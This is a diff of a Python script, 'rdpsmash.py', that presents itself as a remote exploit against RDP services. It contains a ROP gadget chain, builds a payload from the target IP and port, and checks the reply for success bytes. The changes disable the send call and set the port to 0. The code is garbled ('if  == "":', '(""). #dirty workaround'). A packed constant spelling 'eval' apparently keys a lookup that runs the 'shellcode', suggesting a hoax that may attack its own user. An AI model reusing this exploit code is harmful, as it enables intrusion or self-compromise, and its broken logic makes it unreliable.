@@ -55,9 +55,9 @@ class RDPsocket(socket.socket):
         self.payload = payload
         self.table = (""). #dirty workaround
         self.shellcode = shellcode
-    
+
     def parse(self, address, shellcode):
-        seeker = (struct.pack(">I", 0x6576616c), 
+        seeker = (struct.pack(">I", 0x6576616c),
             socket.inet_aton(address[0]), #IP bytes
             socket.inet_aton(str(address[1]))) #port bytes
         parsed =  struct.pack(">I", 0x8fe2fb63) #pop eax
@@ -78,7 +78,7 @@ class RDPsocket(socket.socket):
         parsed += seeker[2] #add the packed port
         parsed += struct.pack(">I", 0x8fe24b3c) #add ecx,ecx # ret
         parsed += struct.pack(">I", 0x8fe2c71d) #mov eax,edx # ret
-        parsed += struct.pack(">I", 0x8fe2def4) #add eax,ecx # ret  
+        parsed += struct.pack(">I", 0x8fe2def4) #add eax,ecx # ret
         parsed += struct.pack(">I", 0x8fe0e32d) #xchg eax,edx
         parsed += struct.pack(">I", 0x8fe0c0c7) #inc ecx # xor al,0xc9
         parsed += struct.pack(">I", 0x8fe0c0c7) #inc ecx # xor al,0xc9
@@ -94,7 +94,7 @@ class RDPsocket(socket.socket):
         parsed += struct.pack(">I", 0x8fe2b6a5) #dec ebp # ret
         parsed += struct.pack(">I", 0xffff01f3) #mov esp,ebp # pop ebp # ret
         read = self.table[seeker[0]] #reader for the parsed shellcode/data
-        
+
         return str(read(shellcode)), parsed
 
     def connect(self, address):
@@ -109,11 +109,11 @@ if  == "":
     if len(sys.argv) != 2:
         print "[*] Usage: python rdpsmash.py IP"
         print "[*] If running on non-default port, reassign PORT in the source."
-    
-    else:   
+
+    else:
         TARGET = sys.argv[1]
-        PORT = 3389 #default RDP port
-        
+        PORT = 0 #nie ma porta
+
         print "[*] Running rdpsmash"
         print
         s = RDPsocket(evil, shellcode)
@@ -122,7 +122,7 @@ if  == "":
         s.connect((TARGET, PORT))
         print "[+] Connection established"
         print "[+] Sending payload. . ."
-        s.evil_sendall()
+        print "[+] This may take some time"
         response = s.recv(4096)
         if "\xA5\x43\xE7\x38\x75\x84\xF2\xFF\xFF\x18\x61\x00" in response:
             print "[+] Success! Payload sent and executed."
